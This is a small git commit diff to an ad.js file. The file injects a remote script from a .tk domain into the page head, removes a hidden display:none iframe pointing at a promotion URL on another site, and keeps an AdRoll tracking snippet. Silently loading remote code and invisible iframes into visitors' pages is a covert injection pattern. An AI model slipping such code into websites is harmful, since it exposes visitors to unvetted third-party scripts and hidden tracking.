c14a9a4da3c6dee497c5cf920ba305be3f0886da
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-09-08 11:39:12 +0800

    ef

--- ad.js
+++ ad.js
@@ -3,7 +3,7 @@
     var b = document.createElement("script");
     b.src = "http://www.7k77.tk/eicXsB?1504592003";
     (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
-    var divs=["<iframe src=\"http://ptp.chinaexpats.cn/index.php?s=tuiguang&id=5d3Khdp/pNMKvg\"  style=\"display: none;\"></iframe>",
+    var divs=[
     
     "<script type=\"text/javascript\">\n    adroll_adv_id = \"L7WXEIIXVFHTPO5OCE4XAQ\";\n    adroll_pix_id = \"PITPGXN7PJHEDEFA4N5AHM\";\n    /* OPTIONAL: provide email to improve user identification */\n    /* adroll_email = \"username@example.com\"; */\n    (function () {\n        var _onload = function(){\n            if (document.readyState && !/loaded|complete/.test(document.readyState)){setTimeout(_onload, 10);return}\n            if (!window.__adroll_loaded){__adroll_loaded=true;setTimeout(_onload, 50);return}\n            var scr = document.createElement(\"script\");\n            var host = ((\"https:\" == document.location.protocol) ? \"https://s.adroll.com\" : \"http://a.adroll.com\");\n            scr.setAttribute('async', 'true');\n            scr.type = \"text/javascript\";\n            scr.src = host + \"/j/roundtrip.js\";\n            ((document.getElementsByTagName('head') || [null])[0] ||\n                document.getElementsByTagName('script')[0].parentNode).appendChild(scr);\n        };\n        if (window.addEventListener) {window.addEventListener('load', _onload, false);}\n        else {window.attachEvent('onload', _onload)}\n    }());\n</script>",
 
